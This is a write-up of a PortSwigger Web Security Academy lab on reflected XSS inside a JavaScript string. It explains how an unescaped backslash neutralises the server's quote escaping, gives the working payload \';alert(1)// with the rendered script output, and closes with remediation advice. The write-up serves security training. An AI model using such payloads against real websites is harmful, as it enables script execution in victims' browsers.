# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

## Overview

- **Category:** Cross-Site Scripting (Reflected XSS / JavaScript String Context)
- **Difficulty:** Practitioner
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab reflects user input inside a single-quoted JavaScript string literal within an inline `<script>` block. The application HTML-encodes angle brackets (`<`, `>`) and double quotes (`"`), and escapes single quotes (`'` → `\'`). However, it fails to escape backslashes (`\`) themselves. By supplying a backslash immediately before a single quote (`\'`), the server escapes only the single quote, producing `\\'`—where the first backslash escapes the second backslash, leaving the single quote unescaped to terminate the string literal.

---

## Attack Scenario & Mental Model

```text
ATTACKER GOAL
  Execute alert(1) in the browser via Reflected XSS
      ↓
VICTIM / DELIVERY
  User visiting a crafted search URL (`/?search=...`)
      ↓
SOURCE
  URL query parameter: GET /?search=...
      ↓
CONTEXT & ESCAPE ANALYSIS
  Input is reflected inside an inline `<script>` block:
  var searchTerms = 'USER_INPUT';
  - Angle brackets (`<`, `>`) are HTML-encoded (`&lt;`, `&gt;`) -> `</script>` blocked.
  - Single quotes (`'`) are escaped with a backslash (`\'`).
  - Backslashes (`\`) are NOT escaped!
      ↓
INJECTION (Escaping the Escape Character)
  If we send `\'`:
  1. Our `\` passes through untouched.
  2. Our `'` is escaped by the server into `\'`.
  3. Combined output becomes `\\'`.
  4. The JavaScript lexer treats `\\` as an escaped literal backslash character,
     which means the following `'` is no longer escaped and closes the string!
      ↓
SINK
  Payload: \';alert(1)//
  Rendered inside `<script>`:
  var searchTerms = '\\';alert(1)//';
      ↓
BROWSER BEHAVIOR
  1. `var searchTerms = '\\';` assigns a single literal backslash to `searchTerms`.
  2. `alert(1)` executes as the next JavaScript statement.
  3. `//';` comments out the trailing quote left by the template.
      ↓
IMPACT
  Arbitrary JavaScript execution (`alert(1)`) in the victim's browser context.
```

---

## Step-by-Step Walkthrough

### 1. Probing the Escaping Behavior
Submitted our standard probe string containing a single quote, backslash, and angle brackets:

```text
test'\<>
```

Inspected the HTML response in Burp Suite:

```html
<script>
    var searchTerms = 'test\'\&lt;&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Observation:
- `<` and `>` became `&lt;` and `&gt;`.
- `'` became `\'`.
- The standalone `\` remained a single `\` (not escaped to `\\`).

### 2. Neutralizing the Server's Backslash
By placing our own backslash immediately before a single quote (`\'`), the server prepends its escape backslash to the quote, turning `\'` into `\\'`.

To complete the exploit without requiring a second single quote (which would otherwise be escaped by the server), we terminate the statement with `;`, call `alert(1)`, and comment out the rest of the line with `//`:

```text
\';alert(1)//
```

### 3. Execution
Submitting `\';alert(1)//` in the search box produced:

```html
<script>
    var searchTerms = '\\';alert(1)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

The browser closed the string literal after `\\`, executed `alert(1)`, ignored the commented remainder `//';`, and solved the lab.

---

## Key Takeaways & Remediation

### The Golden Rule of Backslash Escaping
Whenever an escaping mechanism uses an escape character (like `\`) to neutralize delimiters (like `'` or `"`), **it must also escape the escape character itself (`\` → `\\`)**. Failing to escape `\` allows an attacker to supply an uneven/even sequence of backslashes to neutralize the added escape character.

### Remediation
- **Escape Backslashes First:** In custom or template-based JS string encoders, always escape `\` to `\\` before escaping quotes (`'` → `\'`, `"` → `\"`), and encode `</script>` boundaries.
- **Use Standard JSON Serialization:** Serialize data safely using standard JSON encoders (with HTML-safe flags for `<`, `>`, `&`) or pass data via non-executable DOM attributes (`data-*`).
